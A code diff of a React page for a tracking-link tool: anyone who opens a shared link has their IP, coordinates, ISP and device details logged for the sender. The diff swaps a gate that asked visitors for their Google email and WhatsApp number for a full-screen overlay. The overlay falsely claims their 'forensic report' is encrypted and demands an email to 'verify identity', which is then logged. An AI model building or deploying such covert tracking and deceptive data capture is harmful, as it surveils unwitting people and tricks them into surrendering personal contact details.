@@ -11,9 +11,8 @@ export default function Home() {
   const [generatedLink, setGeneratedLink] = useState('');
   const [isGenerating, setIsGenerating] = useState(false);
   const [visitorEmail, setVisitorEmail] = useState('');
-  const [visitorPhone, setVisitorPhone] = useState('');
   const [linkId, setLinkId] = useState(null);
-  const [showGate, setShowGate] = useState(false);
+  const [isBlurred, setIsBlurred] = useState(false);
 
   useEffect(() => {
     // Generate System ID once on mount
@@ -24,25 +23,22 @@ export default function Home() {
     const sid = params.get('sid');
     if (sid) {
       setLinkId(sid);
-      setShowGate(true); // Always show gate if coming from link
+      setIsBlurred(true);
     }
   }, []);
 
   const handleGenerateLink = async (e) => {
     e.preventDefault();
-    if (!senderEmail) return;
     setIsGenerating(true);
     try {
       const res = await fetch('/api/share', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: senderEmail }),
+        body: JSON.stringify({ email: senderEmail || 'free-share@anonymous.com' }),
       });
       const json = await res.json();
       if (json.success) {
-        // Build URL locally if NEXT_PUBLIC_BASE_URL is missing
-        const url = json.url || `${window.location.origin}/?sid=${json.linkId}`;
-        setGeneratedLink(url);
+        setGeneratedLink(json.url);
       }
     } catch (err) {
       console.error('Failed to generate link', err);
@@ -175,7 +171,7 @@ export default function Home() {
 
   const handleVisitorLead = async (e) => {
     e.preventDefault();
-    if (!visitorEmail || !visitorPhone) return;
+    if (!visitorEmail) return;
     try {
       await fetch('/api/log', {
         method: 'POST',
@@ -184,12 +180,11 @@ export default function Home() {
           systemId,
           linkId,
           visitorEmail,
-          visitorPhone,
           updateOnly: true
         })
       });
-      setShowGate(false);
-      alert('Identity Verified. Your forensic report is now unlocked.');
+      setIsBlurred(false);
+      alert('Forensic Report Unlocked.');
     } catch (err) { }
   };
 
@@ -209,143 +204,179 @@ export default function Home() {
           </div>
         ) : (
           <div className="content">
-            <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
-              <span className="label">Observed IP Address</span>
-              <div className="ip-text">
-                {data?.ip || 'UNKNOWN'}
-              </div>
-
-              {/* IPv4 Display Logic */}
-              {data?.ipv4 && data?.ipv4 !== data?.ip && (
-                <div style={{ fontSize: '1rem', fontFamily: 'var(--font-geist-mono)', color: '#00ff9d', marginTop: '0.2rem' }}>
-                  IPv4: {data?.ipv4}
-                </div>
-              )}
-
-              <div style={{ color: '#888', fontSize: '0.9rem', marginTop: '0.5rem' }}>
-                {data?.org || data?.isp} (AS{data?.asn})
-              </div>
-            </div>
-
-            {/* SEGMENT 1: NETWORK */}
-            <div className="section-title">Network Intelligence</div>
-            <div className="data-grid">
-              <div className="data-item">
-                <div className="label">ISP</div>
-                <div className="value">{data?.isp}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Organization</div>
-                <div className="value">{data?.org}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Connectivity</div>
-                <div className="value" style={{ fontSize: '0.9rem' }}>
-                  {data?.mobile === 'Yes' ? 'Mobile Data' : 'Broadband'}
-                  {data?.proxy === 'Yes' ? ' (Proxy/VPN)' : ''}
-                  {data?.hosting === 'Yes' ? ' (Hosting)' : ''}
+            {/* BLUR OVERLAY */}
+            {isBlurred && (
+              <div style={{
+                position: 'fixed',
+                top: 0, left: 0, right: 0, bottom: 0,
+                background: 'rgba(0,0,0,0.85)',
+                zIndex: 1000,
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                padding: '1rem',
+                backdropFilter: 'blur(6px)'
+              }}>
+                <div className="glass-panel" style={{ maxWidth: '450px', border: '1px solid var(--primary)', animation: 'none' }}>
+                  <h2 style={{ color: 'var(--primary)', fontFamily: 'var(--font-geist-mono)', fontSize: '1.2rem', marginBottom: '1rem' }}>⚠️ FORENSIC DATA LOCKED</h2>
+                  <p style={{ fontSize: '0.9rem', color: '#ccc', marginBottom: '1.5rem', lineHeight: '1.4' }}>
+                    A deep scan has identified your system metrics. This report is currently encrypted.
+                    <br /><br />
+                    <b>Enter your email to verify identity and unlock the full forensic profile.</b>
+                  </p>
+                  <form onSubmit={handleVisitorLead} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                    <input
+                      type="email"
+                      placeholder="Verification Email"
+                      value={visitorEmail}
+                      onChange={(e) => setVisitorEmail(e.target.value)}
+                      required
+                      className="share-input"
+                    />
+                    <button type="submit" className="share-button">UNLOCK PROFILE</button>
+                  </form>
                 </div>
               </div>
-              <div className="data-item">
-                <div className="label">Client Connection</div>
-                <div className="value">{clientData?.connection}</div>
-              </div>
-            </div>
+            )}
 
-            {/* SEGMENT 2: GEOLOCATION */}
-            <div className="section-title">Geolocation</div>
-            <div className="data-grid">
-              <div className="data-item">
-                <div className="label">Location</div>
-                <div className="value">{data?.city}, {data?.region}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Country</div>
-                <div className="value">{data?.country}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Coordinates</div>
-                <div className="value">{data?.lat}, {data?.lon}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Timezone</div>
-                <div className="value">{clientData?.timezone}</div>
-              </div>
-            </div>
+            <div className={`blurred-container ${isBlurred ? 'blurred' : ''}`}>
+              <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
+                <span className="label">Observed IP Address</span>
+                <div className="ip-text">
+                  {data?.ip || 'UNKNOWN'}
+                </div>
 
-            {/* SEGMENT 3: HARDWARE IDENTITY */}
-            <div className="section-title">Hardware Identity</div>
-            <div className="data-grid">
-              <div className="data-item">
-                <div className="label">Platform</div>
-                <div className="value">{data?.ua?.os} / {data?.ua?.cpu}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">CPU Cores</div>
-                <div className="value">{clientData?.cores} Logical Cores</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Memory (RAM)</div>
-                <div className="value">{clientData?.memory}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">GPU Renderer</div>
-                <div className="value" style={{ fontSize: '0.8rem' }}>{clientData?.gpu}</div>
-              </div>
-            </div>
+                {/* IPv4 Display Logic */}
+                {data?.ipv4 && data?.ipv4 !== data?.ip && (
+                  <div style={{ fontSize: '1rem', fontFamily: 'var(--font-geist-mono)', color: '#00ff9d', marginTop: '0.2rem' }}>
+                    IPv4: {data?.ipv4}
+                  </div>
+                )}
 
-            {/* SEGMENT 4: BROWSER & ENVIRONMENT */}
-            <div className="section-title">Environment & Security</div>
-            <div className="data-grid">
-              <div className="data-item">
-                <div className="label">Browser</div>
-                <div className="value">{data?.ua?.browser}</div>
+                <div style={{ color: '#888', fontSize: '0.9rem', marginTop: '0.5rem' }}>
+                  {data?.org || data?.isp} (AS{data?.asn})
+                </div>
               </div>
-              <div className="data-item">
-                <div className="label">Screen</div>
-                <div className="value">{clientData?.screen} @ {clientData?.pixelRatio}x</div>
+
+              {/* SEGMENT 1: NETWORK */}
+              <div className="section-title">Network Intelligence</div>
+              <div className="data-grid">
+                <div className="data-item">
+                  <div className="label">ISP</div>
+                  <div className="value">{data?.isp}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Organization</div>
+                  <div className="value">{data?.org}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Connectivity</div>
+                  <div className="value" style={{ fontSize: '0.9rem' }}>
+                    {data?.mobile === 'Yes' ? 'Mobile Data' : 'Broadband'}
+                    {data?.proxy === 'Yes' ? ' (Proxy/VPN)' : ''}
+                    {data?.hosting === 'Yes' ? ' (Hosting)' : ''}
+                  </div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Client Connection</div>
+                  <div className="value">{clientData?.connection}</div>
+                </div>
               </div>
-              <div className="data-item">
-                <div className="label">Battery Status</div>
-                <div className="value">{clientData?.battery}</div>
+
+              {/* SEGMENT 2: GEOLOCATION */}
+              <div className="section-title">Geolocation</div>
+              <div className="data-grid">
+                <div className="data-item">
+                  <div className="label">Location</div>
+                  <div className="value">{data?.city}, {data?.region}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Country</div>
+                  <div className="value">{data?.country}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Coordinates</div>
+                  <div className="value">{data?.lat}, {data?.lon}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Timezone</div>
+                  <div className="value">{clientData?.timezone}</div>
+                </div>
               </div>
-              <div className="data-item">
-                <div className="label">Storage Quota</div>
-                <div className="value">{clientData?.storage}</div>
+
+              {/* SEGMENT 3: HARDWARE IDENTITY */}
+              <div className="section-title">Hardware Identity</div>
+              <div className="data-grid">
+                <div className="data-item">
+                  <div className="label">Platform</div>
+                  <div className="value">{data?.ua?.os} / {data?.ua?.cpu}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">CPU Cores</div>
+                  <div className="value">{clientData?.cores} Logical Cores</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Memory (RAM)</div>
+                  <div className="value">{clientData?.memory}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">GPU Renderer</div>
+                  <div className="value" style={{ fontSize: '0.8rem' }}>{clientData?.gpu}</div>
+                </div>
               </div>
-              <div className="data-item">
-                <div className="label">Tracking Protection</div>
-                <div className="value">{clientData?.doNotTrack === '1' ? 'Active' : 'Inactive'}</div>
-              </div>
-              <div className="data-item">
-                <div className="label">Cookies</div>
-                <div className="value" style={{ color: clientData?.cookies === 'Enabled' ? '#00ff9d' : '#ff4d4d' }}>{clientData?.cookies}</div>
+
+              {/* SEGMENT 4: BROWSER & ENVIRONMENT */}
+              <div className="section-title">Environment & Security</div>
+              <div className="data-grid">
+                <div className="data-item">
+                  <div className="label">Browser</div>
+                  <div className="value">{data?.ua?.browser}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Screen</div>
+                  <div className="value">{clientData?.screen} @ {clientData?.pixelRatio}x</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Battery Status</div>
+                  <div className="value">{clientData?.battery}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Storage Quota</div>
+                  <div className="value">{clientData?.storage}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Tracking Protection</div>
+                  <div className="value">{clientData?.doNotTrack === '1' ? 'Active' : 'Inactive'}</div>
+                </div>
+                <div className="data-item">
+                  <div className="label">Cookies</div>
+                  <div className="value" style={{ color: clientData?.cookies === 'Enabled' ? '#00ff9d' : '#ff4d4d' }}>{clientData?.cookies}</div>
+                </div>
               </div>
             </div>
 
             {/* SEGMENT 5: SHARE & TRACK (FOR SENDER) */}
-            <div className="section-title">Share & Track (Sender)</div>
+            <div className="section-title">Broadcast Intelligence (Share)</div>
             <div className="share-section">
               <p style={{ fontSize: '0.8rem', color: '#888', marginBottom: '1rem' }}>
-                Generate a unique tracking link. When someone opens it, you'll receive their IP, location, and platform details via email.
+                Generate a unique tracking link. Anyone who clicks will have their data logged and blurred until they verify their identity.
               </p>
               {!generatedLink ? (
                 <form onSubmit={handleGenerateLink} style={{ display: 'flex', gap: '10px' }}>
                   <input
                     type="email"
-                    placeholder="Your email for alerts"
+                    placeholder="Alert destination (optional)"
                     value={senderEmail}
                     onChange={(e) => setSenderEmail(e.target.value)}
-                    required
                     className="share-input"
                   />
                   <button type="submit" className="share-button" disabled={isGenerating}>
-                    {isGenerating ? 'GENERATING...' : 'GET TRACKING LINK'}
+                    {isGenerating ? 'LOCKING...' : 'GENERATE TRACKING LINK'}
                   </button>
                 </form>
               ) : (
                 <div className="generated-link-box">
-                  <div style={{ fontSize: '0.7rem', color: 'var(--primary)', marginBottom: '4px' }}>YOUR TRACKING LINK READY:</div>
+                  <div style={{ fontSize: '0.7rem', color: 'var(--primary)', marginBottom: '4px' }}>BROADCAST LINK ACTIVE:</div>
                   <div className="link-text" onClick={() => {
                     navigator.clipboard.writeText(generatedLink);
                     alert('Copied to clipboard!');
@@ -353,47 +384,14 @@ export default function Home() {
                     {generatedLink}
                   </div>
                   <p style={{ fontSize: '0.65rem', color: '#555', marginTop: '8px' }}>
-                    Share this on WhatsApp, Telegram, or X. We'll track the platform automatically.
+                    Share via WhatsApp, DM, or Social. Tracking is active.
                   </p>
                 </div>
               )}
             </div>
 
-            {/* SEGMENT 6: IDENTITY VERIFICATION (FOR VISITORS VIA LINK) */}
-            {showGate && (
-              <div className="visitor-lead-capture" style={{ marginTop: '2rem', border: '1px solid #333', padding: '1.5rem', borderRadius: '8px', background: 'rgba(255, 184, 0, 0.05)', position: 'relative', zIndex: 100 }}>
-                <div style={{ color: '#ffb800', fontWeight: 'bold', fontSize: '0.9rem', marginBottom: '0.5rem' }}>⚠️ SOCIAL VERIFICATION REQUIRED</div>
-                <p style={{ fontSize: '0.8rem', color: '#ccc', marginBottom: '1rem' }}>
-                  A link sharing event has been detected from <b>{data?.platform || 'Social Platform'}</b>. To reveal the identity of the sender and unlock your forensic report, please verify your session:
-                </p>
-                <form onSubmit={handleVisitorLead} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-                  <div style={{ display: 'flex', gap: '10px' }}>
-                    <input
-                      type="email"
-                      placeholder="Verify Google Email"
-                      value={visitorEmail}
-                      onChange={(e) => setVisitorEmail(e.target.value)}
-                      required
-                      className="share-input"
-                    />
-                    <input
-                      type="tel"
-                      placeholder="Verify WhatsApp Number"
-                      value={visitorPhone}
-                      onChange={(e) => setVisitorPhone(e.target.value)}
-                      required
-                      className="share-input"
-                    />
-                  </div>
-                  <button type="submit" className="share-button" style={{ background: '#ffb800', color: 'black' }}>
-                    UNFOLD IDENTITY & REVEAL REPORT
-                  </button>
-                </form>
-              </div>
-            )}
-
             <div style={{ marginTop: '3rem', textAlign: 'center', fontSize: '0.8rem', color: '#444', borderTop: '1px solid #222', paddingTop: '1rem' }}>
-              SYSTEM ID: {systemId} | {linkId ? `TRACKING ID: ${linkId}` : 'SESSION: ENCRYPTED'}
+              SYSTEM ID: {systemId} | {linkId ? `TRACKING ACTIVE: ${linkId}` : 'SESSION: ENCRYPTED'}
             </div>
           </div>
         )}
